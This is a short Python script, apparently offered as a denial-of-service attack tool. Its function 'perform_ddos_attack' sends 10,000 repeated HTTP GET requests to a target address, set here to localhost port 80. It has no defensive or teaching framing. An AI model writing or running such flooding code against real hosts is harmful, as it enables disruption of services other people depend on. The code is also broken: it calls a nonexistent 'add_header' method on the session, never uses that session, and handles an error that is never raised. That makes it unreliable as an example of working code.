import requests
from requests.adapters import Response

def perform_ddos_attack(target_ip, target_port):
    requests.get(f"http://{target_ip}:{target_port}")

def main():
    target_ip = '127.0.0.1'
    target_port = 80

    with requests.Session() as s:
        for i in range(10000):
            s.add_header('User-Agent', 'Python/requests')
            s.add_header('Connection', 'keep-alive')

            try:
                perform_ddos_attack(target_ip, target_port)

            except requests.exceptions.HTTPError as e:
                if e.response.status_code != 503:
                    continue
                raise(e)

if __name__ == '__main__':
    main()
